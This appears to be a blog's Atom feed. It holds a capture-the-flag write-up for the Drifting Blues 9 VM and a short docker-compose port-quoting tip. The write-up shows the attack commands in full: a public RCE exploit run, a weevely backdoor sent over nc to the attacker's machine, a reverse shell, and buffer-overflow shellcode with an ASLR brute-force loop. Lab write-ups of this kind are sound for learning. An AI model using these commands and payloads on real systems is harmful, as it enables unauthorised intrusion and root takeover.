<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <title><![CDATA[devGiants]]></title>
    <link href="/atom.xml" rel="self"/>
    <link href="/"/>
    <updated>2021-07-16T17:03:58+02:00</updated>
    <id>/</id>
        <generator uri="http://sculpin.io/">Sculpin</generator>
            <entry>
            <title type="html"><![CDATA[Drifting Blues 9 write-up]]></title>
            <link href="/blog/2021/07/15/drifting-blues-9-writeup/"/>
            <updated>2021-07-15T10:40:00+02:00</updated>
            <id>/blog/2021/07/15/drifting-blues-9-writeup/</id>
            <content type="html"><![CDATA[<p>This is my write-up (my very first !) for Drifting Blues 9 VM, available on <a href="https://hackmyvm.eu/">HackMyVM</a> platform.</p>

<h2 id="enumeration">Enumeration</h2>

<p>After launching VM, I start as always by evaluate network attack footprint.</p>

<h3 id="finding-vm-ip">Finding VM IP</h3>

<p>My local subnet is in the CIDR range 192.168.1.0/24, I do a <code>nmap</code> quick ping scan</p>

<pre><code># nmap -sn 192.168.1.0/24
</code></pre>

<p>Among another known hosts, the VM popped up :</p>

<pre><code># nmap -sn 192.168.1.0/24
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-16 03:08 EDT
...
Nmap scan report for debian.home (192.168.1.30)
Host is up (0.00090s latency).
MAC Address: 01:23:45:67:89:AB (Oracle VirtualBox virtual NIC)
...
Nmap done: 256 IP addresses (X hosts up) scanned in 2.11 seconds

</code></pre>

<p>The target machine is already name <code>debian.home</code>, no need to amend <code>/etc/hosts</code> for giving convenient name.</p>

<h3 id="port-enumeration">Port enumeration</h3>

<p>Now I focus on this target, by examining ports status :</p>

<pre><code>nmap debian.home -p-
</code></pre>

<p>This will perform :
- A complete port scan, on all ports range (2<sup>16</sup>, 65535)
- Using TCP SYN port scan
- With normal timing (3)</p>

<pre><code># nmap debian.home -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-16 03:20 EDT
Nmap scan report for debian.home (192.168.1.30)
Host is up (0.00011s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
40592/tcp open  unknown
MAC Address: 08:00:27:6A:29:81 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.68 seconds
</code></pre>

<h2 id="web-part">Web part</h2>

<p>Something is on 80, probably a webapp. Here is the homepage :</p>

<p><img src="https://imgur.com/oYUSdHl.png" alt="Web app homepage" /></p>

<p>Looks like another blogging platform, with one article.</p>

<h3 id="about-structure">About structure</h3>

<p>I try to find unreferenced files or backups. As it is php application
(click on 'Category 1' on right drives me to http://debian.home/index.php?page=posts&amp;cat_id=1),
I focus on related extensions :</p>

<pre><code>gobuster dir -u debian.home -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak
</code></pre>

<p><code>gobuster</code> is a powerful directory/file enumerator. Here :
- Put it in directory/file enumeration mode.
- Use widely known directories list from <code>dirbuster</code> (available in Kali), the medium size one.
- Focus on <code>php</code>, <code>html</code>, <code>txt</code> and <code>bak</code> extensions (for sniffing automatic backup files)</p>

<pre><code># gobuster dir -u debian.home -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://debian.home
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,bak,txt
[+] Timeout:                 10s
===============================================================
2021/07/16 03:32:16 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--&gt; http://debian.home/images/]
/index.php            (Status: 200) [Size: 5650]
/docs                 (Status: 301) [Size: 309] [--&gt; http://debian.home/docs/]
/page                 (Status: 301) [Size: 309] [--&gt; http://debian.home/page/]
/header.php           (Status: 200) [Size: 13]
/admin                (Status: 301) [Size: 310] [--&gt; http://debian.home/admin/]
/footer.php           (Status: 500) [Size: 614]
/license              (Status: 301) [Size: 312] [--&gt; http://debian.home/license/]
/README.txt           (Status: 200) [Size: 975]
/js                   (Status: 301) [Size: 307] [--&gt; http://debian.home/js/]
/include              (Status: 301) [Size: 312] [--&gt; http://debian.home/include/]
/backup               (Status: 301) [Size: 311] [--&gt; http://debian.home/backup/]
/styles               (Status: 301) [Size: 311] [--&gt; http://debian.home/styles/]
/INSTALL.txt          (Status: 200) [Size: 1201]
/wysiwyg              (Status: 301) [Size: 312] [--&gt; http://debian.home/wysiwyg/]
/server-status        (Status: 403) [Size: 276]
/mails                (Status: 301) [Size: 310] [--&gt; http://debian.home/mails/]

===============================================================
2021/07/16 03:36:12 Finished
===============================================================
</code></pre>

<p>Strange, some directories popped up. Let's go to the <code>admin</code> one, http://debian.home/images :</p>

<p><img src="https://imgur.com/6cmw9ki.png" alt="Image directory" /></p>

<p>Seems directory indexes are allowed ! With this information, I can wander and gather precious informations
on site structure. I open http://debian.home/includes, you can see and find all *.php files.</p>

<p>Another point of interest : INSTALL.txt</p>

<p>http://debian.home/INSTALL.txt</p>

<pre><code>///////////////////////////////////////////////////////////////////////////////////
//
// Advanced Power of PHP
// ---------------------
// http://www.apphp.com
//
// ApPHP MicroBlog Free
//
// Version: 1.0.1
//
///////////////////////////////////////////////////////////////////////////////////

Software requirements: PHP 5.0 or later version.

To install ApPHP MicroBlog, you should have to extract the ApPHP MicroBlog ZIP file.
It depends on the operating system you use.
Once extracted, you will have a directory containing the ApPHP MicroBlog script.

Upload all content of this directory to your webserver, either by copying the
directory or by using an FTP program.

Then you will need to run the installation module.
To do this you need to open a browser and type in the URL:

If you are running on your own computer, this will be

   http://localhost/{micro-blog directory}/install.php

or if on a live server:

   http://{www.mydomain.com}/install.php

On this page you need:

1. Enter connection parameters:
   database host, database name, username, password.

2. Enter admin login and admin password, that you will use to administer the site.
</code></pre>

<p>Multiples informations here :
- <code>install.php</code> is mentioned but not found
- Web app system is ApPHP MicroBlog Free, version 1.0.1</p>

<h3 id="exploitation">Exploitation</h3>

<p>Quick <code>searchsploit</code> looks promising :</p>

<pre><code># searchsploit apphp 1.0.1
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
ApPHP MicroBlog 1.0.1 - Multiple Vulnerabilities                                    | php/webapps/33030.txt
ApPHP MicroBlog 1.0.1 - Remote Command Execution                                    | php/webapps/33070.py
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
</code></pre>

<p>Let's examine RCE. It's a python script that take in as argument the site URL running ApPHP webapp.
It should send back a shell.</p>

<pre><code># searchsploit -x 33070
  Exploit: ApPHP MicroBlog 1.0.1 - Remote Command Execution
      URL: https://www.exploit-db.com/exploits/33070
     Path: /usr/share/exploitdb/exploits/php/webapps/33070.py
File Type: Python script, ASCII text executable, with CRLF line terminators
</code></pre>

<p>Run the exploit :</p>

<ul>
<li>It's a Python 2.X script only</li>
<li>It's mandatory to provide <code>index.php</code></li>
</ul>

<pre><code># python2.7 /usr/share/exploitdb/exploits/php/webapps/33070.py http://debian.home/index.php

 -= LOTFREE exploit for ApPHP MicroBlog 1.0.1 (Free Version) =-
original exploit by Jiko : http://www.exploit-db.com/exploits/33030/
[*] Testing for vulnerability...
[+] Website is vulnerable

[*] Fecthing phpinfo
    PHP Version 5.6.40-0+deb8u12
    System   Linux debian 3.16.0-4-586 #1 Debian 3.16.51-2 (2017-12-03) i686
    Loaded Configuration File   /etc/php5/apache2/php.ini
    Apache Version   Apache/2.4.10 (Debian)
    User/Group   www-data(33)/33
    Server Root   /etc/apache2
    DOCUMENT_ROOT   /var/www/html
    PHP Version   5.6.40-0+deb8u12
    allow_url_fopen  On  On
    allow_url_include  Off  Off
    disable_functions  pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,  pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,
    open_basedir   no value    no value
    System V Message based IPC   Wez Furlong
    System V Semaphores   Tom May
    System V Shared Memory   Christian Cartus

[*] Fetching include/base.inc.php
&lt;?php
            // DATABASE CONNECTION INFORMATION
            define('DATABASE_HOST', 'localhost');           // Database host
            define('DATABASE_NAME', 'microblog');           // Name of the database to be used
            define('DATABASE_USERNAME', 'clapton'); // User name for access to database
            define('DATABASE_PASSWORD', 'yaraklitepe'); // Password for access to database
            define('DB_ENCRYPT_KEY', 'p52plaiqb8');     // Database encryption key
            define('DB_PREFIX', 'mb101_');          // Unique prefix of all table names in the database
            ?&gt;

[*] Testing remote execution
[+] Remote exec is working with system() :)
Submit your commands, type exit to quit
&gt;
</code></pre>

<p>So I have a shell. I also have as a banner a dump of <code>base.inc.php</code> file and some informations
related to PHP version a command execution mode.</p>

<p>As we entered by regular PHP app, we logically are <code>www-data</code> :</p>

<pre><code>&gt; whoami
www-data
&gt;
</code></pre>

<h3 id="immediate-connection-persistence">Immediate connection persistence</h3>

<h4 id="backdoor-creation-%3A-%60weevely%60">Backdoor creation : <code>weevely</code></h4>

<p>Let's put a backdoor to ensure permanent connection, even in case flaw would be corrected.
We use <a href="https://github.com/epinna/weevely3">weevely</a>, which allow some builtin commands, obfuscation,
and some auto-completion.</p>

<p><em>Note : the shell provided does not have TTY, we'll see later how to workaround</em>.</p>

<p>On my hacking machine, I generate a backdoor :</p>

<pre><code>#`weevely`generate pass ./shell.php
</code></pre>

<p>Let's find a place where we can put our backdoor.
In the shell provided by exploit, simple <code>ls -la</code> show that <code>/var/www/html</code> seems to be owned by <code>root:root</code>.</p>

<p>Let's take a step upper and find all writable directories by current user (<code>www-data</code>) :</p>

<pre><code>&gt; find / -writable | grep -v -E "proc|dev"

...
/var/www/html/include
...
&gt;
</code></pre>

<p>Among other results, we found that <strong>only one directory in Apache exposed stucture is writable</strong>. It is mandatory
to push the backdoor in HTTP-reachable point, in order to use it. This is the good place.</p>

<h4 id="backdoor-sending">Backdoor sending</h4>

<p>Let's create a reverse shell, not redirected to bash, but where in and out streams are from and to files</p>

<h5 id="on-hacking-machine">On hacking machine</h5>

<p><code>nc -lnvp 10000 &lt; ./shell.php</code></p>

<p>When a connection will occurs, the <code>./shell.php</code> file content will be sent</p>

<h5 id="on-vm">On VM</h5>

<p><code>nc 192.168.1.26 10000 &gt; /var/www/html/include/shell.php</code></p>

<p>This assumes that my hacking machine is reachable at <code>192.168.1.26</code></p>

<p>When transfer is done, <code>CTRL+C</code> both side of connection.</p>

<h4 id="backdoor-usage">Backdoor usage</h4>

<pre><code>weevely http://debian.home/include/shell.php pass

[+]`weevely`4.0.1

[+] Target: debian.home
[+] Session:    /root/.weevely/sessions/debian.home/shell_0.session

[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.

weevely&gt;
</code></pre>

<p>Here we are permanently connected.</p>

<h2 id="privilege-escalation">Privilege escalation</h2>

<p>Try to find other interesting users :</p>

<pre><code>weevely&gt; :audit_etcpasswd
...
clapton:x:1000:1000:,,,:/home/clapton:/bin/bash
...
</code></pre>

<p>This must be the user to reach for owning <code>user.txt</code>.</p>

<h3 id="trying-to-break-in-%60clapton%60">Trying to break in <code>clapton</code></h3>

<p>Nothing obvious (to me) at this point. So using<code>weevely``:file_upload</code> command, I uploaded <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS"><code>linpeas.sh</code></a>.</p>

<p>But for comfortably running linpeas, or even run <code>su</code> command, a TTY shell is required,
which is unfortunatly not the case with weevely.</p>

<h4 id="spawn-a-tty-shell">Spawn a TTY shell</h4>

<ul>
<li>on my hacking machine, <code>nc -lnvp 10000</code> : connection opening on 10000</li>
<li>on VM, use another<code>weevely</code>command : <code>:backdoor_reversetcp kali 10000</code></li>
</ul>

<p>Now, several methods exists for spawning shell with TTY, I used the latter (to be runned on VM) :</p>

<p><code>python -c 'import pty; pty.spawn("/bin/sh")'</code></p>

<p>Followed by <code>export TERM=xterm</code> and now I have a "real" shell;</p>

<h4 id="linpeas.sh">Linpeas.sh</h4>

<p>I run it : <code>./linpeas.sh &gt; /tmp/results.log</code>
Here again, nothing seemed relevant in report. It suggests to try user = password.</p>

<p><code>~ su clapton</code> with "clapton" as password failed.</p>

<p>I tried then with the database password (found in <code>/var/www/html/include/base.inc.php</code>)</p>

<p>Bingo :) ! got to <code>/home/clapton</code> and flag <code>user.txt</code>.</p>

<h2 id="getting-root">Getting root</h2>

<p>Home directory content :</p>

<pre><code>clapton@debian:~$ ls -la
ls -la
total 24
dr-x------ 2 clapton clapton 4096 May  9 17:13 .
drwxr-xr-x 3 root    root    4096 May  9 16:57 ..
-rwsr-xr-x 1 root    root    5150 Sep 22  2015 input
-rwxr-xr-x 1 root    root     201 May  9 17:15 note.txt
-rw-r--r-- 1 clapton clapton   32 May  9 17:21 user.txt
</code></pre>

<p><code>note.txt</code> leads to buffer overflow (this VM is tagged as easy...). I spotted that it is suid, and owned by root.
So <strong>any execution will use root privileges instead of the current user ones</strong>.</p>

<h3 id="buffer-overflow">Buffer overflow</h3>

<p>Basic calls :</p>

<pre><code>clapton@debian:~$ ./input
./input
Syntax: ./input &lt;input string&gt;
</code></pre>

<p>There is a parameter, that must be put in buffer, that can be overflowed.</p>

<pre><code>clapton@debian:~$ ./input 1111
./input 1111
</code></pre>

<h4 id="decompilation">Decompilation</h4>

<p>I retrieve the executable to my hacking machine by putting it in <code>/var/www/html/include</code>
(using<code>weevely</code>and www-data user). So after I can regularily download it.</p>

<p>Feeding it to <a href="https://ghidra-sre.org/">GHIDRA</a>, here is <code>main</code> function decompiled :</p>

<pre><code class="c">int main(int argc,char **argv)
{
  char local_af [171];

  if (argc &lt; 2) {
    printf("Syntax: %s &lt;input string&gt;\n",*argv);
    /* WARNING: Subroutine does not return */
    exit(0);
  }
  strcpy(local_af,argv[1]);
  return 0;
}
</code></pre>

<p>Vulnerable buffer is <code>local_af</code>, and size is 171.</p>

<h5 id="alternative-for-finding-buffer-size%2C-without-ghidra-and-on-target">Alternative for finding buffer size, without GHIDRA and on target</h5>

<pre><code>clapton@debian:~$ gdb ./input
(gdb) info functions
    info functions
    All defined functions:

    Non-debugging symbols:
    0x080482d4  _init
    0x08048310  printf@plt
    0x08048320  strcpy@plt
    0x08048330  __gmon_start__@plt
    0x08048340  exit@plt
    0x08048350  __libc_start_main@plt
    0x08048360  _start
    0x08048390  __x86.get_pc_thunk.bx
    0x080483a0  deregister_tm_clones
    0x080483d0  register_tm_clones
    0x08048410  __do_global_dtors_aux
    0x08048430  frame_dummy
    0x0804845d  main
    0x080484b0  __libc_csu_init
    0x08048520  __libc_csu_fini
    0x08048524  _fini

</code></pre>

<p>Now disassemble main :</p>

<pre><code>(gdb) disass main
    disass main
    Dump of assembler code for function main:
       0x0804845d &lt;+0&gt;:     push   %ebp
       0x0804845e &lt;+1&gt;:     mov    %esp,%ebp
       0x08048460 &lt;+3&gt;:     and    $0xffffff&gt;
       0x08048463 &lt;+6&gt;:     sub    $0xb0,%esp
       0x08048469 &lt;+12&gt;:    cmpl   $0x1,0x8(&gt;
       0x0804846d &lt;+16&gt;:    jg     0x8048490&gt;
       0x0804846f &lt;+18&gt;:    mov    0xc(%ebp)&gt;
       0x08048472 &lt;+21&gt;:    mov    (%eax),%e&gt;
       0x08048474 &lt;+23&gt;:    mov    %eax,0x4(&gt;
       0x08048478 &lt;+27&gt;:    movl   $0x804854&gt;
       0x0804847f &lt;+34&gt;:    call   0x8048310&gt;
       0x08048484 &lt;+39&gt;:    movl   $0x0,(%es&gt;
       0x0804848b &lt;+46&gt;:    call   0x8048340&gt;
       0x08048490 &lt;+51&gt;:    mov    0xc(%ebp)&gt;
       0x08048493 &lt;+54&gt;:    add    $0x4,%eax
       0x08048496 &lt;+57&gt;:    mov    (%eax),%e&gt;
       0x08048498 &lt;+59&gt;:    mov    %eax,0x4(&gt;
       0x0804849c &lt;+63&gt;:    lea    0x11(%esp&gt;
       0x080484a0 &lt;+67&gt;:    mov    %eax,(%es&gt;
       0x080484a3 &lt;+70&gt;:    call   0x8048320&gt;
       0x080484a8 &lt;+75&gt;:    mov    $0x0,%eax
       0x080484ad &lt;+80&gt;:    leave
       0x080484ae &lt;+81&gt;:    ret
</code></pre>

<p>Assembler code states that buffer size is 0xB0 (<code>sub    $0xb0,%esp</code>), which is decimal 176.
Though we know that the real number is 171. Why this difference? According to my searches, it seems that GDB pads buffers
size by 16 bits. So 171 become 176 (the next 16 bits block).</p>

<p>In Kali, one can use some Metasploit tools
(<a href="https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_create.rb">pattern_create</a>
and <a href="https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb">pattern_offset</a>):</p>

<pre><code># /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
</code></pre>

<p>Now, in GDB (on VM) :</p>

<pre><code>(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Program received signal SIGSEGV, Segmentation fault.
    0x41376641 in ?? ()
</code></pre>

<p>SEGFAULT happened because we overflowed the buffer. With <code>pattern_offset</code>, one can now find precisely the buffer size :</p>

<p>In Kali</p>

<pre><code># /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 200 -q 41376641
[*] Exact match at offset 171
</code></pre>

<p>Here again, 171.</p>

<h4 id="exploitation">Exploitation</h4>

<p>I found on exploit DB a Linux <code>/bin/sh</code> exec : <a href="https://www.exploit-db.com/exploits/13357">13357</a></p>

<h5 id="first-payload">First payload</h5>

<ul>
<li>Find size, python len() : 55 bytes</li>
<li>Order we want : NOP + SHELLCODE + PAD + EIP</li>
<li>171 - 55 = 116, let's divide both side</li>
<li>58 bytes NOP</li>
<li>58 bytes PAD</li>
</ul>

<p>Code (exploit_1.py):</p>

<pre><code class="python">import struct
pad = "\x41" * 58
EIP = struct.pack("I", 0xbfe0e210)

shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
NOP = "\x90" * 58
print NOP + shellcode + pad + EIP
</code></pre>

<ul>
<li>Fill with 'A'</li>
<li><code>struct.pack</code> is useful for little-endianing addresses (bytes inversion)</li>
</ul>

<p>Then I can push <code>exploit_1.py</code> to VM by using <code>:file_upload``weevely</code>command</p>

<h5 id="return-address-to-put-in-eip">Return address to put in EIP</h5>

<p>For finding return address :</p>

<pre><code>(gdb) run $(python /tmp/exploit_1.py)
Program received signal SIGSEGV, Segmentation fault.
    0xc042dc78 in ?? ()
</code></pre>

<p>Then look the resulting stack :</p>

<pre><code>(gdb) x/100x $esp-200
x/100x $esp-200
0xbf9f3558: 0x00000000  0x080484a8  0xbf9f3571  0xbf9f3cdc
0xbf9f3568: 0x00000000  0xb773db48  0x90909001  0x90909090
0xbf9f3578: 0x90909090  0x90909090  0x90909090  0x90909090
0xbf9f3588: 0x90909090  0x90909090  0x90909090  0x90909090
0xbf9f3598: 0x90909090  0x90909090  0x90909090  0x90909090
0xbf9f35a8: 0x31909090  0xb0db31c0  0x5380cd06  0x74742f68
0xbf9f35b8: 0x642f6879  0xe3897665  0xb966c931  0x05b02712
0xbf9f35c8: 0xc03180cd  0x2f2f6850  0x2f686873  0x896e6962
0xbf9f35d8: 0x895350e3  0x0bb099e1  0x414180cd  0x41414141
0xbf9f35e8: 0x41414141  0x41414141  0x41414141  0x41414141
0xbf9f35f8: 0x41414141  0x41414141  0x41414141  0x41414141
0xbf9f3608: 0x41414141  0x41414141  0x41414141  0x41414141
0xbf9f3618: 0x41414141  0xc042dc78  0x00000000  0xbf9f36b4
0xbf9f3628: 0xbf9f36c0  0xb774fe9a  0x00000002  0xbf9f36b4
0xbf9f3638: 0xbf9f3654  0x0804974c  0x0804821c  0xb7732000
0xbf9f3648: 0x00000000  0x00000000  0x00000000  0x135ab3f4
0xbf9f3658: 0x965b37e5  0x00000000  0x00000000  0x00000000
0xbf9f3668: 0x00000002  0x08048360  0x00000000  0xb77556e0
0xbf9f3678: 0xb75db639  0xb7762000  0x00000002  0x08048360
0xbf9f3688: 0x00000000  0x08048381  0x0804845d  0x00000002
0xbf9f3698: 0xbf9f36b4  0x080484b0  0x08048520  0xb7750350
0xbf9f36a8: 0xbf9f36ac  0x0000001c  0x00000002  0xbf9f3cc8
0xbf9f36b8: 0xbf9f3cdc  0x00000000  0xbf9f3d8c  0xbf9f3db9
---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---

</code></pre>

<p><code>0xbf9f3588</code> seems to be a good address candidate for jumping into the <a href="https://en.wikipedia.org/wiki/NOP_slide">NOP seld</a></p>

<p>I tried to send it again, and got resulting stack :</p>

<pre><code>(gdb) x/100x $esp-200
x/100x $esp-200
0xbfc6c468: 0x00000000  0x080484a8  0xbfc6c481  0xbfc6dcdc
0xbfc6c478: 0x00000000  0xb77a5b48  0x90909001  0x90909090
0xbfc6c488: 0x90909090  0x90909090  0x90909090  0x90909090
0xbfc6c498: 0x90909090  0x90909090  0x90909090  0x90909090
0xbfc6c4a8: 0x90909090  0x90909090  0x90909090  0x90909090
0xbfc6c4b8: 0x31909090  0xb0db31c0  0x5380cd06  0x74742f68
0xbfc6c4c8: 0x642f6879  0xe3897665  0xb966c931  0x05b02712
0xbfc6c4d8: 0xc03180cd  0x2f2f6850  0x2f686873  0x896e6962
0xbfc6c4e8: 0x895350e3  0x0bb099e1  0x414180cd  0x41414141
0xbfc6c4f8: 0x41414141  0x41414141  0x41414141  0x41414141
0xbfc6c508: 0x41414141  0x41414141  0x41414141  0x41414141
0xbfc6c518: 0x41414141  0x41414141  0x41414141  0x41414141
0xbfc6c528: 0x41414141  0xc042dc78  0x00000000  0xbfc6c5c4
0xbfc6c538: 0xbfc6c5d0  0xb77b7e9a  0x00000002  0xbfc6c5c4
0xbfc6c548: 0xbfc6c564  0x0804974c  0x0804821c  0xb779a000
0xbfc6c558: 0x00000000  0x00000000  0x00000000  0x56222d49
0xbfc6c568: 0x13c58958  0x00000000  0x00000000  0x00000000
0xbfc6c578: 0x00000002  0x08048360  0x00000000  0xb77bd6e0
0xbfc6c588: 0xb7643639  0xb77ca000  0x00000002  0x08048360
0xbfc6c598: 0x00000000  0x08048381  0x0804845d  0x00000002
0xbfc6c5a8: 0xbfc6c5c4  0x080484b0  0x08048520  0xb77b8350
0xbfc6c5b8: 0xbfc6c5bc  0x0000001c  0x00000002  0xbfc6dcc8
0xbfc6c5c8: 0xbfc6dcdc  0x00000000  0xbfc6dd8c  0xbfc6ddb9
---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
</code></pre>

<p>0xbfc6c488 - 0xbf9f3588 = 278F00. Such big distance can lead to <a href="https://fr.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a> enabled.</p>

<p>How to check :</p>

<pre><code>clapton@debian:~$ cat /proc/sys/kernel/randomize_va_space
cat /proc/sys/kernel/randomize_va_space
2
</code></pre>

<p>Damned ! "2" means it is enabled, so we can't predict with reasonable error the jumping address.</p>

<h5 id="second-payload-%3A-repetition">Second payload : repetition</h5>

<p>Now the idea is <strong>to repeat the program execution with a payload that will maximize chance for
our return address to target in NOP sled</strong>.</p>

<p>As the stack location is random in memory each execution, I will create loop with "enough" tries (try and mistake mode)
in order to force the probability of my address pointing in NOP sled to occur.</p>

<p>So I need a different payload :</p>

<pre><code class="python">import struct
pad = "\x41" * 171
EIP = struct.pack("I", 0xbfe0e210)

shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31&gt;
NOP = "\x90" * 20000
print pad + EIP + NOP + shellcode
</code></pre>

<ul>
<li>Fill all the buffer with 'A'</li>
<li>Put last address inside EIP target</li>
<li>Shellcode</li>
<li>Massive NOP sled : 20000</li>
</ul>

<p>Order is also different in order to be unlimited in NOP sled size.</p>

<p>I uploaded it with <code>weevely</code> using <code>:file_upload</code> command, named <code>exploit_aslr.py</code></p>

<p>First try on VM:</p>

<pre><code>clapton@debian:~$ for i in {0..100}; do ./input $(/tmp/exploit_aslr.py): done
Segmentation fault
Segmentation fault
Segmentation fault
...
clapton@debian:~$

</code></pre>

<p>Unlucky. Second try, with 1000 occurences :</p>

<pre><code>clapton@debian:~$ for i in {0..1000}; do ./input $(/tmp/exploit_aslr.py): done
Segmentation fault
Segmentation fault
Segmentation fault
...
#
</code></pre>

<p>Got it ! The <code>#</code> indicates we are root :</p>

<pre><code># whoami
whoami
root
#
</code></pre>

<p>Now I can flag the <code>root.txt</code>.</p>

<h2 id="deadends">Deadends</h2>

<h3 id="web-app">Web app</h3>

<ul>
<li>Using weevely, start SQL console and search for admin credentials.</li>
<li>It is encrypted, find in <code>var/www/html/include/classes/Accounts.class.php</code> that is AES encryption
with salt.</li>
<li>Update admin password : <code>update microblog.mb101_accounts set password = AES_ENCRYPT('pass','p52plaiqb8') WHERE id = 1;</code></li>
<li>Logged as admin... Nothing !</li>
</ul>

<h3 id="rpc">RPC</h3>

<p>Initial <code>nmap</code> scan showed 111/tcp opened. Wander for RPC (especially NFS misconfiguration), but I found nothing.</p>

<pre><code>111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          39735/udp6  status
|   100024  1          48044/udp   status
|   100024  1          59229/tcp   status
|_  100024  1          59230/tcp6  status
</code></pre>
]]></content>
        </entry>
            <entry>
            <title type="html"><![CDATA[Docker compose port mapping subtlety]]></title>
            <link href="/blog/2021/04/12/docker-compose-port-mapping-subtlety/"/>
            <updated>2021-04-12T10:40:00+02:00</updated>
            <id>/blog/2021/04/12/docker-compose-port-mapping-subtlety/</id>
            <content type="html"><![CDATA[<h2 id="%60docker-compose%60-port-mapping-description"><code>docker-compose</code> port mapping description</h2>

<p><code>docker-compose</code> allows you to specify port mapping between the container you're defining and the host.
Thus you can reach any service you would register to this port container (i.e Apache/Nginx on 80/443, FTP on 20/21/22...)
by host ports. According to <a href="https://docs.docker.com/compose/compose-file/compose-file-v3/#ports">compose file syntax</a>, you can use several markups to do so :</p>

<pre><code class="yaml">ports:
- "3000"
- "3000-3005"
- "8000:8000"
- "9090-9091:8080-8081"
- "49100:22"
- "127.0.0.1:8001:8001"
- "127.0.0.1:5000-5010:5000-5010"
- "127.0.0.1::5000"
- "6060:6060/udp"
- "12400-12500:1240"
</code></pre>

<h2 id="problem-that-can-arise">Problem that can arise</h2>

<p>I took wrong habits on my early days with <code>docker-compose</code>, such as <strong>not double quoting port mapping specification</strong>.
So above example become :</p>

<pre><code class="yaml">ports:
- 3000
- 3000-3005
- 8000:8000
- 9090-9091:8080-8081
- 49100:22
- 127.0.0.1:8001:8001
- 127.0.0.1:5000-5010:5000-5010
- 127.0.0.1::5000
- 6060:6060/udp
- 12400-12500:1240
</code></pre>

<p>Unquoted, expression like <code>21:21</code> will be handled by <a href="https://yaml.org/spec/1.1/">YAML engine</a> by <a href="https://en.wikipedia.org/wiki/Sexagesimal#cite_note-17">a sexagesimal notation</a> (base-60 value expression)
The integer obtained can be quite large and will definitely not be the one you expected.</p>

<ul>
<li>Best case : it raises an exception on your <code>up</code> process because your port number computed is above the <img src="http://www.sciweavers.org/tex2img.php?eq=%202%5E%7B16%7D%20-1&amp;bc=Transparent&amp;fc=Gray&amp;im=png&amp;fs=12&amp;ff=arev&amp;edit=0" alt="equation" /> limit.</li>
<li>Worst case: it generates a valid free port number and you realize at runtime there is a port communcation problem.</li>
</ul>

<p><em>Note this will only happens if the port is lower than 60 (to be able to enter in a modulo calculus regarding to base-60).</em></p>

<p><code>docker-compose</code> documentation added a note to underline this case :</p>

<blockquote>
